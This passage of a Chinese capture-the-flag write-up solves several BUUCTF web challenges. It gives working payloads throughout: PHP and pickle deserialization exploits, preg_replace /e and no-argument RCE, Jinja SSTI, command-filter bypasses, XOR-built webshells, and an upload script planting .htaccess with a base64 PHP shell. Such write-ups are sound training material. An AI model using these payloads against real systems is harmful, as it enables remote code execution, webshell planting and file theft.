echo file_get_contents($this-&gt;file); echo \"&lt;br&gt;\"; return (\"U R SO CLOSE !///COME ON PLZ\"); } } } ?&gt; 我们看到，这里构造了一个Flag类，并且在此处可以读到flag.php的内容，由此得知password传入的肯定是此处序列化的内容，可以用下面的代码拿到序列化的字符串： &lt;?php class Flag{ //flag.php public $file = \"flag.php\"; public function __tostring(){ if(isset($this-&gt;file)){ echo file_get_contents($this-&gt;file); echo \"&lt;br&gt;\"; return (\"U R SO CLOSE !///COME ON PLZ\"); } } } $a = new Flag;echo serialize($a);?&gt; O:4:\"Flag\":1:{s:4:\"file\";s:8:\"flag.php\";} 然后再构造payload读取flag： /?text=data:text/plain,welcome to the zjctf&amp;file=useless.php&amp;password=O:4:\"Flag\":1:{s:4:\"file\";s:8:\"flag.php\";} 查看源码拿到flag。 [BJDCTF2020]ZJCTF，不过如此是上道题的改版，原题是支持远程文件读取的，但是放到BUU上好像不行了… 这道题在上道题的基础上考了preg_replace()的RCE。本RCE参考：https://xz.aliyun.com/t/2557 题目分析首先看代码： &lt;?phperror_reporting(0);$text = $_GET[\"text\"];$file = $_GET[\"file\"];if(isset($text)&amp;&amp;(file_get_contents($text,'r')===\"I have a dream\")){ echo \"&lt;br&gt;&lt;h1&gt;\".file_get_contents($text,'r').\"&lt;/h1&gt;&lt;/br&gt;\"; if(preg_match(\"/flag/\",$file)){ die(\"Not now!\"); } include($file); //next.php }else{ highlight_file(__FILE__);}?&gt; 相同的操作拿到next.php的源码： &lt;?php$id = $_GET['id'];$_SESSION['id'] = $id;function complex($re, $str) { return preg_replace( '/(' . $re . ')/ei', 'strtolower(\"\\\\1\")', $str );}foreach($_GET as $re =&gt; $str) { echo complex($re, $str). \"\\n\";}function getFlag(){ @eval($_GET['cmd']);} 这里我们看到语句preg_replace('/(' . $re . ')/ei','strtolower(&quot;\\\\1&quot;)',$str)中采用了preg_replace/e模式，因此可以利用上面提到的RCE来写入小马，构造payload如下： /next.php?id=1&amp;\\S*=${eval($_POST[x])} 这样构造的原因： preg_replace函数在匹配到符号正则的字符串时，会将替换字符串（也就是上图preg_replace函数的第二个参数）当做代码来执行，然而这里的第二个参数却固定为'strtolower(&quot;\\\\1&quot;)'字符串，就需要想办法来执行它。 上面的命令执行，相当于eval('strtolower(&quot;\\\\1&quot;);')结果，当中的\\\\1实际上就是\\1，而\\1在正则表达式中有自己的含义： 对一个正则表达式模式或部分模式两边添加圆括号将导致相关匹配存储到一个临时缓冲区中，所捕获的每个子匹配都按照在正则表达式模式中从左到右出现的顺序存储。缓冲区编号从1开始，最多可存储99个捕获的子表达式。每个缓冲区都可以使用'\\n'访问，其中n为一个标识特定缓冲区的一位或两位十进制数。 所以这里的\\1实际上指定的是第一个子匹配项，参考前面的链接，我们传入\\S*=${eval($_POST[x])}便可以将小马写入(S原本是.，但是传参数首字符是特殊字符的时候会被替换为_，用S可以绕过)。 解题用上面的payload写入小马，然后用蚁剑连接拿到shell，即可拿到flag。注意这里我们并没有把上面的语句写入到指定的文件，而是访问的时候${eval($_POST[x])}语句首先被执行了，因此才可以连接上，那么我们连接的时候用的也就是整个url了。 [极客大挑战 2019]BuyFlag考察is_numeric()和strcmp()两个函数的漏洞 补充知识 php中的strcmp漏洞 传入的期望类型是字符串类型的数据，但是如果我们传入非字符串类型的数据的时候，这个函数接受到了不符合的类型将发生错误，但是在5.3之前的php中，显示了报错的警告信息后，仍将return 0（表示两个字符串相等）。那么利用数组即可绕过判断。 php中的is_numeric()漏洞 is_numeric函数对于空字符%00，无论是%00放在前后都可以判断为非数值，而%20空格字符只能放在数值后。所以，查看函数发现该函数对对于第一个空格字符会跳过空格字符判断，接着后面的判断。 题目分析在PAYFLAG页面源码中发现如下代码： ~~~post money and password~~~if (isset($_POST['password'])) { $password = $_POST['password']; if (is_numeric($password)) { echo \"password can't be number&lt;/br&gt;\"; }elseif ($password == 404) { echo \"Password Right!&lt;/br&gt;\"; } 提示我们传入money和password，可以看到利用password=404%20即可绕过is_numeric的判断。抓包发现cookie值为0，而并没有采用PHPSESSID，将其改为1即可，发送之后回显如下：从中看到了对money的判断，看到PHP版本是5.3的，猜测是strcmp函数比较的，利用数组绕过即可。成功拿到flag。**其实对于money的绕过还可以采用科学计数法money=1e11。 [CISCN 2019]ikun考察薅羊毛逻辑漏洞：通过抓包修改折扣等数据来购买flag；jwt-cookies伪造、python反序列化 题目分析进入题目之后提示要买到lv6我们看到每个商品都有个等级的标签，查看标签命名是lvx.png，因此若要找到lv6的地方，可以用下面的脚本代码： import requestsurl=\"http://6e7db183-764d-4afc-bdbb-b70791536e4a.node3.buuoj.cn/shop?page=\"for i in range(0,2000): r=requests.get(url+str(i)) if 'lv6.png' in r.text: print (i) break 跑出来lv6在181页，但是发现太贵了…抓包发现可以设置折扣，这里就用到了薅羊毛逻辑漏洞。然后页面返回提示需要是admin抓包发现cookie采用了JWT(此处可了解JWT)，我们把JWT拿去base64解码得到 {\"alg\":\"HS256\",\"typ\":\"JWT\"}{\"username\":\"123\"}¶«L=\u0003\u001fm\u001að¢ÖÙJh\u000fÎ\u001aö7Éq\"&gt;[¿ 其中username中是我们登录的用户名，等下伪造JWT时改为admin即可；另外，伪造JWT还需要秘钥，可以利用c-jwt-cracker来破解：拿到秘钥之后，到JWT生成网站伪造admin的JWT：拿伪造的JWT伪装成管理员，然后得到了一个压缩包的地址： 然后需要成为大会员，BP抓包发现是利用become传参，在源码的Admin.py中找到了这个参数： def post(self, *args, **kwargs): try: become = self.get_argument('become') p = pickle.loads(urllib.unquote(become)) return self.render('form.html', res=p, member=1) except: return self.render('form.html', res='This is Black Technology!', member=0) 我们看到，这个地方利用了pickle.loads对become传参进行反序列化(关于pickle)，现在就需要构造可读取flag文件的序列化字符串赋给become利用Python反序列化的漏洞拿到flag。 解题从图中看到：我们可以利用reduce，当reduce被定义之后，该对象被Pickle时就会被调用我们这里的eval用于重建对象的时候调用，即告诉python如何pickle他们供eval使用的即打开的文件flag.txt，EXP如下： #python3import picklefrom urllib import parseclass payload(object): def __reduce__(self): return (eval, (\"open('/flag.txt','r').read()\",))a = pickle.dumps(payload())a = parse.quote(a)print (a)#python2import pickleimport urllibclass payload(object): def __reduce__(self): return (eval, (\"open('/flag.txt','r').read()\",))a = pickle.dumps(payload())a = urllib.quote(a)print a 生成payload： c__builtin__%0Aeval%0Ap0%0A%28S%22open%28%27/flag.txt%27%2C%27r%27%29.read%28%29%22%0Ap1%0Atp2%0ARp3%0A. 利用前面伪造的JWT同时将上面的payload传给参数become即可拿到flag。关于Python反序列化漏洞的参考：Pickle反序列化漏洞：https://xz.aliyun.com/t/2289cPickle反序列化漏洞：https://blog.csdn.net/SKI_12/article/details/85015803Python-sec的一些总结：http://bendawang.site/2018/03/01/%E5%85%B3%E4%BA%8EPython-sec%E7%9A%84%E4%B8%80%E4%BA%9B%E6%80%BB%E7%BB%93/ [ASIS 2019]Unicorn shop考察unicode安全问题，参考如下链接：浅谈Unicode设计的安全性Unicode等价性浅谈UNICODE SECURITY CONSIDERATIONS 解题查看源码发现在charset=UTF-8处提示Ah,really important,seriously.，说明是考察与unicode安全相关的知识，再看题目页面，可以买四种独角兽，但是前三种价格都是一位数，而第四个却是四位数，猜测flag就在第四个。但是输入框只能输入一个字符，参考网上的资料，到前面的网站找一个大于1337的特殊unicode字符，然后将其进行url编码填入输入框拿到flag。可以去这里找。 [WesternCTF 2018]shrine考察SSTI服务端模板注入，参考https://www.cnblogs.com/wangtanzhi/p/12238779.html 题目分析import flaskimport osapp = flask.Flask(__name__)app.config['FLAG'] = os.environ.pop('FLAG')@app.route('/')def index(): return open(__file__).read()@app.route('/shrine/&lt;path:shrine&gt;')def shrine(shrine): def safe_jinja(s): s = s.replace('(', '').replace(')', '') blacklist = ['config', 'self'] return ''.join(['{{% set {}=None%}}'.format(c) for c in blacklist]) + s return flask.render_template_string(safe_jinja(shrine))if __name__ == '__main__': app.run(debug=True) 可以看到/shrine/路径下存在对用户输入到模板数据的过滤，(、)被替换为空，config、self都被黑名单过滤掉，但是还是避免不了存在SSTI，先拿一个数学表达式测试一下：2，发现可以执行。接着看代码， app.config['FLAG'] = os.environ.pop('FLAG') 这里注册一个名为FLAG的config，flag应该就在这，这个地方原本可以直接通过读取所有app.config的内容的，但是前面说过config已经被过滤了：下面这行代码就是将config和self替换为空。 return ''.join(['{{% set {}=None%}}'.format(c) for c in blacklist]) 但是这里黑名单过滤的内容比较少，其实还有其他内置函数能实现同样的功能，如url_for和get_flashed_messages关于这两个函数可以参考：https://www.jianshu.com/p/bcf57a3092ce 解题直接上payload了 /shrine/{{url_for.__globals__['current_app'].config}}/shrine/{{get_flashed_messages.__globals__['current_app'].config}} 读取到flag如下：PHP中也有很多模板渲染的漏洞，以后遇到了慢慢学吧。附上一个模板注入点扫描工具tplmap [安洵杯 2019]easy_web考察多次编码，MD5强碰撞 题目分析进入题目之后，看题目的url发现了可疑的参数img和cmd，并且img的值是一串base64，解码之后还是base64，再解码拿到一串hex码，最终解码是555.png，这就说明，读取文件的时候是先进行hex编码，然后两次base64编码传参，那么我们利用这个特点就可以读其他文件了。先看index.php的内容，三次编码传参之后拿到源码： &lt;?phperror_reporting(E_ALL || ~ E_NOTICE);header('content-type:text/html;charset=utf-8');$cmd = $_GET['cmd'];if (!isset($_GET['img']) || !isset($_GET['cmd'])) header('Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd=');$file = hex2bin(base64_decode(base64_decode($_GET['img'])));$file = preg_replace(\"/[^a-zA-Z0-9.]+/\", \"\", $file);if (preg_match(\"/flag/i\", $file)) { echo '&lt;img src =\"./ctf3.jpeg\"&gt;'; die(\"xixi～ no flag\");} else { $txt = base64_encode(file_get_contents($file)); echo \"&lt;img src='data:image/gif;base64,\" . $txt . \"'&gt;&lt;/img&gt;\"; echo \"&lt;br&gt;\";}echo $cmd;echo \"&lt;br&gt;\";if (preg_match(\"/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\\'|\\\"|\\`|;|,|\\*|\\?|\\\\|\\\\\\\\|\\n|\\t|\\r|\\xA0|\\{|\\}|\\(|\\)|\\&amp;[^\\d]|@|\\||\\\\$|\\[|\\]|{|}|\\(|\\)|-|&lt;|&gt;/i\", $cmd)) { echo(\"forbid ~\"); echo \"&lt;br&gt;\";} else { if ((string)$_POST['a'] !== (string)$_POST['b'] &amp;&amp; md5($_POST['a']) === md5($_POST['b'])) { echo `$cmd`; } else { echo (\"md5 is funny ~\"); }}?&gt;&lt;html&gt;&lt;style&gt; body{ background:url(./bj.png) no-repeat center center; background-size:cover; background-attachment:fixed; background-color:#CCCCCC;}&lt;/style&gt;&lt;body&gt;&lt;/body&gt;&lt;/html&gt; 可以看到preg_match(&quot;/flag/i&quot;, $file)说明flag在/flag中，同时 preg_match(\"/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\\'|\\\"|\\`|;|,|\\*|\\?|\\\\|\\\\\\\\|\\n|\\t|\\r|\\xA0|\\{|\\}|\\(|\\)|\\&amp;[^\\d]|@|\\||\\\\$|\\[|\\]|{|}|\\(|\\)|-|&lt;|&gt;/i\", $cmd) 对cmd传参内容进行了很多的过滤，可以看到cat被ban了，但是对\\用了\\\\来过滤，之前打比赛遇到过，这样匹配其实匹配不到\\，因此可以借助ca\\t来绕过，这里其实还可以用sort命令来读取flag的。 sort：sort将文件的每一行作为一个单位，相互比较，比较原则是从首字符向后，依次按ASCII码值进行比较，最后将他们按升序输出。 其实Linux中对命令过滤的绕过方式还很多，参考这里 另一个考点是MD5强比较绕过： if ((string)$_POST['a'] !== (string)$_POST['b'] &amp;&amp; md5($_POST['a']) === md5($_POST['b'])) { echo `$cmd`;} 这里是固定用法： a=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2&amp;b=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2 其实原理是生成两个txt文件，文件内容只有几位不同，但最后的md5值是相同的。 解题利用cmd传参sort%20/flag或ca\\t%20/flag即可，当然c\\at效果一样，这与linux的命令相关，最后拿到flag。巨坑！如果想要用BP抓包改POST的内容，web端一定是要POST传数据，不能GET传参之后抓包再改成POST，否则失败！ [极客大挑战 2019]Upload常规文件上传题，对后缀名进行了过滤，一般用php、php3、php4、php5、phtml、pht来绕过，本题是利用pht绕过的。本题也对&lt;?进行了过滤，利用GIF89a &lt;script language=&quot;php&quot;&gt;eval($_REQUEST[shell])&lt;/script&gt;即可。 解题上传构造好的小马，抓包之后把文件类型改为image/jpg上传之后即可成功解析小马存在了/upload路径下，蚁剑连接拿flag。 [CISCN 2019]Love Math主要考察PHP基本函数的利用，还有变量与函数关联的知识 补充知识一些基本的函数： scandir()函数：返回指定目录中的文件和目录的数组。base_convert()函数：在任意进制之间转换数字。dechex()函数：把十进制转换为十六进制。hex2bin()函数：把十六进制值的字符串转换为 ASCII 字符。var_dump()函数:用于输出变量的相关信息。readfile()函数：输出一个文件。该函数读入一个文件并写入到输出缓冲。若成功，则返回从文件中读入的字节数。若失败，则返回false。您可以通过@readfile()形式调用该函数，来隐藏错误信息。 动态函数 php中可以把函数名通过字符串的方式传递给一个变量，然后通过此变量动态调用函数例如：$function = &quot;sayHello&quot;;$function(); php中函数名默认为字符串 例如本题白名单中的asinh和pi可以直接异或，这就增加了构造字符的选择. 题目分析打开连接，给出了源码： &lt;?phperror_reporting(0);//听说你很喜欢数学，不知道你是否爱它胜过爱flagif(!isset($_GET['c'])){ show_source(__FILE__);}else{ //例子 c=20-1 $content = $_GET['c']; if (strlen($content) &gt;= 80) { die(\"太长了不会算\"); } $blacklist = [' ', '\\t', '\\r', '\\n','\\'', '\"', '`', '\\[', '\\]']; foreach ($blacklist as $blackitem) { if (preg_match('/' . $blackitem . '/m', $content)) { die(\"请不要输入奇奇怪怪的字符\"); } } //常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp $whitelist = ['abs', 'acos', 'acosh', 'asin', 'asinh', 'atan2', 'atan', 'atanh', 'base_convert', 'bindec', 'ceil', 'cos', 'cosh', 'decbin', 'dechex', 'decoct', 'deg2rad', 'exp', 'expm1', 'floor', 'fmod', 'getrandmax', 'hexdec', 'hypot', 'is_finite', 'is_infinite', 'is_nan', 'lcg_value', 'log10', 'log1p', 'log', 'max', 'min', 'mt_getrandmax', 'mt_rand', 'mt_srand', 'octdec', 'pi', 'pow', 'rad2deg', 'rand', 'round', 'sin', 'sinh', 'sqrt', 'srand', 'tan', 'tanh']; preg_match_all('/[a-zA-Z_\\x7f-\\xff][a-zA-Z_0-9\\x7f-\\xff]*/', $content, $used_funcs); foreach ($used_funcs[0] as $func) { if (!in_array($func, $whitelist)) { die(\"请不要输入奇奇怪怪的函数\"); } } //帮你算出答案 eval('echo '.$content.';');} 分析源码可知，对参数内容作了以下的限制： 1、长度不能超过80； 2、不能包含,\\t,\\r,\\n,',&quot;,反引号,[,`]`` 这些字符； 3、不能有不是$whitelist白名单里面的字符串出现； 单单传参c肯定是不行了，有两种思路来拿flag：加一个参数：我们需要构造个$_GET[1]，然后再拿flag，但是[、]都不能用，因此不能直接构造，这个时候我们就可以利用白名单中的那些函数来构造。直接cat flag：也需要用到上面说的一些函数来构造。主要用到base_convert、dechex两个函数，同时将pi、abs当做参数来利用。 解题加参数构造&amp;_GET传参：payload 1： $pi=base_convert(37907361743,10,36)(dechex(1598506324));($$pi){pi}(($$pi){abs})&amp;pi=system&amp;abs=cat /flagbase_convert(37907361743,10,36) =&gt; \"hex2bin\"dechex(1598506324) =&gt; \"5f474554\"$pi=hex2bin(\"5f474554\") =&gt; $pi=\"_GET\" //hex2bin将一串16进制数转换为二进制字符串($$pi){pi}(($$pi){abs}) =&gt; ($_GET){pi}($_GET){abs} //{}可以代替[] 但是这种方法会报400 Bad Request，可能跟构造的&amp;_GET相关，网上参考到不能&amp;_GET传参，可以用header来传，可以构造如下：payload 2 $pi=base_convert,$pi(696468,10,36)($pi(8768397090111664438,10,30)(){1})base_convert(696468,10,36) =&gt; \"exec\"$pi(8768397090111664438,10,30) =&gt; \"getallheaders\"exec(getallheaders(){1})//操作xx和yy，中间用逗号隔开，echo都能输出echo xx,yy 这里用到了apache下的getallheaders这个函数：我们结合这个payload，抓包之后在其中添上1: cat /flag(这里需要注意一下，BUU的flag都在根目录下，直接cat /flag即可，网上一些参考题解是cat flag.php是读不到的)，拿到flag： 直接构造拿cat /flag//exec('hex2bin(dechex(109270211257898))') =&gt; exec('cat f*')($pi=base_convert)(22950,23,34)($pi(76478043844,9,34)(dechex(109270211257898)))//system('cat'.dechex(16)^asinh^pi) =&gt; system('cat *')base_convert(1751504350,10,36)(base_convert(15941,10,36).(dechex(16)^asinh^pi))这两条是参考网上的题解，没有做出更改，用的话稍微改一下即可 [GXYCTF2019]禁止套娃考察无参数RCE，参考这篇文章 题目分析进入题目只有一句flag在哪？其实有点无从下手，参考网上的题解提示是git泄露，但是用githack没跑出来，最后还是用gitextract跑出来了源码：(githack得更新了…) &lt;?phpinclude \"flag.php\";echo \"flag在哪里呢？&lt;br&gt;\";if(isset($_GET['exp'])){ if (!preg_match('/data:\\/\\/|filter:\\/\\/|php:\\/\\/|phar:\\/\\//i', $_GET['exp'])) { if(';' === preg_replace('/[a-z,_]+\\((?R)?\\)/', NULL, $_GET['exp'])) { if (!preg_match('/et|na|info|dec|bin|hex|oct|pi|log/i', $_GET['exp'])) { // echo $_GET['exp']; @eval($_GET['exp']); } else{ die(\"还差一点哦！\"); } } else{ die(\"再好好想想！\"); } } else{ die(\"还想读flag，臭弟弟！\"); }}// highlight_file(__FILE__);?&gt; 我们需要用exp传参，但是参数会经过三层正则匹配的过滤：第一层： preg_match('/data:\\/\\/|filter:\\/\\/|php:\\/\\/|phar:\\/\\//i', $_GET['exp']) 这一层过滤了常用的PHP伪协议第二层： if(';' === preg_replace('/[a-z,_]+\\((?R)?\\)/', NULL, $_GET['exp'])) 这一层的匹配明显提示我们是无参数RCE，其中的?R是递归地进行匹配第三次： if (!preg_match('/et|na|info|dec|bin|hex|oct|pi|log/i', $_GET['exp'])) 过滤掉常见的关键字。直接getflag不现实了，那就想办法利用函数来获取。 解题首先需要获取当前目录下的文件，可以实现的函数有scandir(.)(.表示当前目录)，但是.又不能用，此时想到localeconv()：函数返回一包含本地数字及货币格式信息的数组。数组的第一项就是.这时再借助current()/pos()返回数组中的当前单元, 默认取第一个值。也就是说current(localeconv())就是.了。payload如下： /?exp=print_r(scandir(current(localeconv())));/?exp=print_r(scandir(pos(localeconv()))); 可以看到flag.php在第四个数组元素中，读取它的源码就能拿到flag。如何读取倒数第二个数组元素呢？ 这里有三种方法：1、array_reverse()以相反的顺序返回数组元素，再结合函数next()即可。这里构造payload： /?exp=print_r(next(array_reverse(scandir(current(localeconv()))))); 效果如下：2、array_rand()和array_flip()array_flip()交换数组的键和值；array_rand()从数组中随机取出一个或多个单元，不断刷新访问就会不断随机返回，本题目中scandir()返回的数组只有5个元素，刷新几次就能刷出来flag.php。构造payload： /?exp=print_r(array_rand(array_flip(scandir(current(localeconv()))))); 效果如下：3、session_id(session_start())session_start()启动新会话或者重用现有会话；session_id()获取到当前的session id;本题目虽然ban了hex关键字，导致hex2bin()被禁用，但是我们可以并不依赖于十六进制转ASCII的方式，因为flag.php这些字符是PHPSESSID本身就支持的。这里使用session之前需要通过session_start()告诉PHP使用session，php默认是不主动使用session的。然后利用session_id()获取到当前的session id。我们再在header中设置PHPSESSID的cookie，值就为flag.php，效果如下： 最后如何获取源码呢？因为et被ban，所以可以用readfile()或highlight_file()以及其别名函数show_source()，结合几种方法，最终构造下列payload： /?exp=readfile(next(array_reverse(scandir(current(localeconv())))));/?exp=show_source(next(array_reverse(scandir(current(localeconv())))));/?exp=show_source(session_id(session_start())); //配合BP使用... 自己组合吧 拿到flag： [SUCTF 2019]EasyWeb考察的知识有点杂，主要涉及构造不包含数字和字母的webshell、文件上传绕过、绕过open_basedir/disable_function知识量有点大，好好记录一下。 知识拓展构造不包含数字和字母的webshell首先，明确思路。我的核心思路是，将非字母、数字的字符经过各种变换，最后能构造出a-z中任意一个字符。然后再利用PHP允许动态函数执行的特点，拼接处一个函数名，如assert，然后动态执行之即可。那么，变换方法 将是解决本题的要点。 不过在此之前，我需要说说php5和7的差异。 php5中assert是一个函数，我们可以通过$f='assert';$f(...);这样的方法来动态执行任意代码。 但php7中，assert不再是函数，变成了一个语言结构（类似eval），不能再作为函数名动态执行代码，所以利用起来稍微复杂一点。但也无需过于担心，比如我们利用file_put_contents函数，同样可以用来getshell。以上参考P神的博客。这里介绍三种构造shell的方法：1、利用异或在PHP中，两个字符串执行异或操作以后，得到的还是一个字符串。所以，我们想得到a-z中某个字母，就找到某两个非字母、数字的字符，他们的异或结果是这个字母即可。在PHP中，两个变量进行异或时，先会将字符串转换成ASCII值，再将ASCII值转换成二进制再进行异或，异或之后，又将结果从二进制转换成了ASCII值，再将ASCII值转换成字符串。异或操作有时也被用来交换两个变量的值。这里附上一个网上看到的代码： &lt;?php$l = \"\";$r = \"\";$argv = str_split(\"_GET\");for($i=0;$i&lt;count($argv);$i++){ for($j=0;$j&lt;255;$j++) { $k = chr($j)^chr(255); \\\\dechex(255) = ff if($k == $argv[$i]){ if($j&lt;16){ $l .= \"%ff\"; $r .= \"%0\" . dechex($j); continue; } $l .= \"%ff\"; $r .= \"%\" . dechex($j); continue; } }}echo \"\\{$l`$r\\}\";?&gt; 然后配合下面的payload，可以执行一些函数。 ${%ff%ff%ff%ff^%a0%b8%ba%ab}{%ff}();&amp;ff=phpinfo 抛开这道题，还可以类似这样地使用： http://127.0.0.1/?_=${%ff%ff%ff%ff^%a0%b8%ba%ab}{%ff}(\"type index.php\");&amp;%ff=system。 最后的exp: $a = (%9e ^ %ff).(%8c ^ %ff).(%8c ^ %ff).(%9a ^ %ff).(%8d ^ %ff).(%8b ^ %ff);\\\\assert$b = \"_\" . (%af ^ %ff).(%b0 ^ %ff).(%ac ^ %ff).(%ab ^ %ff);$c = $$b;\\\\$b = $_POST$a($c[777]); 2、取反构造与方法1有异曲同工之妙，唯一差异就是，方法1使用的是位运算里的异或，本方法使用的是位运算里的取反。本方法利用的是UTF-8编码的某个汉字，并将其中某个字符取出来，比如'和'{2}的结果是\\x8c，其取反即为字母s，还有一些其他的如下图：图片来源于P神的那篇文章。当然，在这道题里已经过滤了数字，那怎么来构造{}中的数字呢？这个可以利用PHP的弱类型特性：true的值为1，故true+true==2，也就是('&gt;'&gt;'&lt;')+('&gt;'&gt;'&lt;')==2。然后便可以一步一步构造即可。后面有一篇博客里[SUCTF 2018]GetShell这道题用到了这个知识点。3、自增构造参考http://php.net/manual/zh/language.operators.increment.php可以了解到'a'++ =&gt; 'b'，'b'++ =&gt; 'c'… 所以，我们只要能拿到一个变量，其值为a，通过自增操作即可获得a-z中所有字符。那如何获取a呢？数组Array的第一个字母就是大写A，而且第4个字母是小写a。利用它可以同时拿到a和A，等于我们就可以拿到a-z和A-Z的所有字母了。在PHP中，如果强制连接数组和字符串的话，数组将被转换成字符串，其值为Array，然后再取这个字符串的第一个字符就是A了，同理获取a。还可以利用下面的方式来获取： &lt;?php function B(){ echo \"HI!\"; } $_++; $__= \"?\" ^ \"}\"; $__();? 1、$_++;这行代码的意思是对变量名为_的变量进行自增操作，在PHP中未定义的变量默认值为null，null==false==0，我们可以在不使用任何数字的情况下,通过对未定义变量的自增操作来得到一个数字；2、$__=&quot;?&quot; ^ &quot;}&quot;;对字符?和}进行异或运算，得到结果B赋给变量名为__的变量；3、$__();通过上面的赋值操作，变量$__的值为B，所以这行可以看作是B(),在PHP中,这行代码表示调用函数B,所以执行结果为HI!,在PHP中，我们可以将字符串当作函数来处理。 想要更深的了解，参考前面的链接。 文件上传绕过关于解析之前讲过一个借用.user.ini解析来上传小马的，这里再扩展一下： nginx的服务器，而且上传目录下有一个php文件，所以上传.user.iniapache的服务器，应该上传.htaccess .user.ini的已经讲过了，这里讲一下.htaccess：上传的时候不能用GIF89a等文件头去绕过exif_imagetype,因为这样虽然能上传成功，但.htaccess文件无法生效。这时有两个办法: #define width 1337#define height 1337 #在.htaccess是注释符，所以.htaccess文件可以生效。同时在.htaccess前添加x00x00x8ax39x8ax39(要在十六进制编辑器中添加，或者使用python的bytes类型)，这里x00x00x8ax39x8ax39是wbmp文件的文件头，.htaccess中以0x00开头的同样也是注释符，所以不会影响.htaccess。对&lt;?过滤的绕过对&lt;?绕过的一般可以借用&lt;script language=&quot;php&quot;&gt;&lt;/script&gt;来绕过，但是当PHP的版本是7以上的时候，本方法不可用了，此时需要用另一种方法：可以通过编码进行绕过，如原来使用utf-8编码，如果shell中是用utf-16编码则可以Bypass。在本题中的用法后面再讲。 绕过open_basedir/disable_functionopen_basedir是php.ini中的一个配置选项，它可将用户访问文件的活动范围限制在指定的区域。假设open_basedir=/home/wwwroot/home/web1/:/tmp/，那么通过web1访问服务器的用户就无法获取服务器上除了/home/wwwroot/home/web1/和/tmp/这两个目录以外的文件。注意用open_basedir指定的限制实际上是前缀，而不是目录名。举例来说: 若open_basedir = /dir/user, 那么目录/dir/user和/dir/user1都是可以访问的，所以如果要将访问限制在仅为指定的目录，注意用斜线结束路径名。更多的可以参考这里。 解题进入题目看到源码： &lt;?phpfunction get_the_flag(){ // webadmin will remove your upload file every 20 min!!!! $userdir = \"upload/tmp_\".md5($_SERVER['REMOTE_ADDR']); if(!file_exists($userdir)){ mkdir($userdir); } if(!empty($_FILES[\"file\"])){ $tmp_name = $_FILES[\"file\"][\"tmp_name\"]; $name = $_FILES[\"file\"][\"name\"]; $extension = substr($name, strrpos($name,\".\")+1); if(preg_match(\"/ph/i\",$extension)) die(\"^_^\"); if(mb_strpos(file_get_contents($tmp_name), '&lt;?')!==False) die(\"^_^\"); if(!exif_imagetype($tmp_name)) die(\"^_^\"); $path= $userdir.\"/\".$name; @move_uploaded_file($tmp_name, $path); print_r($path); }}$hhh = @$_GET['_'];if (!$hhh){ highlight_file(__FILE__);}if(strlen($hhh)&gt;18){ die('One inch long, one inch strong!');}if ( preg_match('/[\\x00- 0-9A-Za-z\\'\"\\`~_&amp;.,|=[\\x7F]+/i', $hhh) ) die('Try something else!');$character_type = count_chars($hhh, 3);if(strlen($character_type)&gt;12) die(\"Almost there!\");eval($hhh);?&gt; 可以看到，代码主要分为两部分：get_the_flag()和各种过滤的代码(主要是为了调用get_the_flag())。可以利用下面的代码fuzz一下： for ($i = 0; $i &lt; 256; $i++) { if (!preg_match('/[x00- 0-9A-Za-z'\"`~_&amp;.,|=[x7F]+/i', chr($i))) { echo urlencode(chr($i)).' '; }}?&gt; 获取到没有被ban的字符： ! # $ % ( ) * + - / : ; &lt; &gt; ? @ ] ^ { } 参考前面讲的拿webshell的三种方法，这里取反符号~直接被禁掉了，自增需要用到变量长度会很长,因此尝试使用异或，因为有长度的限制，所以可以去凑出类似$_GET{x}();然后传入x=get_the_flag调用函数。利用下面的脚本来构造： import urllib.parsefind = ['G','E','T','_']for i in range(1,256): for j in range(1,256): result = chr(i^j) if(result in find): a = i.to_bytes(1,byteorder='big') b = j.to_bytes(1,byteorder='big') a = urllib.parse.quote(a) b = urllib.parse.quote(b) print(\"%s:%s^%s\"%(result,a,b)) 拿到payload： ?_=${%fe%fe%fe%fe^%a1%b9%bb%aa}{%fe}();&amp;%fe=get_the_flag 再看get_the_flag的代码，发现是一个上传，从代码可以看出，对ph、&lt;?、文件的类型都做了判断。那只能上传图片马了，但是还需要上传解析图片马的文件，该题的环境是apache，因此需要上传.htaccess，构造的方法前面也讲过了。现在讲一下.htaccess构造的内容，这里将一句话进行base64编码，然后在.htaccess中利用php伪协议进行解码，内容如下： #define width 1337#define height 1337 AddType application/x-httpd-php .jpgphp_value auto_append_file \"php://filter/convert.base64-decode/resource=/var/www/html/upload/tmp_fd40c7f4125a9b9ff1a4e75d293e3080/shell.jpg\" shell.jpg内容： GIF89a12PD9waHAgZXZhbCgkX0dFVFsnYyddKTs/Pg== 参考大佬的一个完整的上传脚本： import requestsimport base64htaccess = b\"\"\"#define width 1337#define height 1337 AddType application/x-httpd-php .jpgphp_value auto_append_file \"php://filter/convert.base64-decode/resource=/var/www/html/upload/tmp_fd40c7f4125a9b9ff1a4e75d293e3080/shell.jpg\"\"\"\"shell = b\"GIF89a12\" + base64.b64encode(b\"&lt;?php eval($_REQUEST['a']);?&gt;\")url = \"http://300a73e6-9981-40dd-b39a-cdf1584e3ba2.node3.buuoj.cn/?_=${%fe%fe%fe%fe^%a1%b9%bb%aa}{%fe}();&amp;%fe=get_the_flag\"files = {'file':('.htaccess',htaccess,'image/jpeg')}data = {\"upload\":\"Submit\"}response = requests.post(url=url, data=data, files=files)print(response.text)files = {'file':('shell.abc',shell,'image/jpeg')}response = requests.post(url=url, data=data, files=files)print(response.text) 然后访问?a=phpinfo();发现存在open_basedir和disable_functions的限制，参考前面讲到的知识，构造最终payload： ?a=chdir('img');ini_set('open_basedir','..');chdir('..');chdir('..');chdir('..');chdir('..');ini_set('open_basedir','/');print_r(scandir('/')); 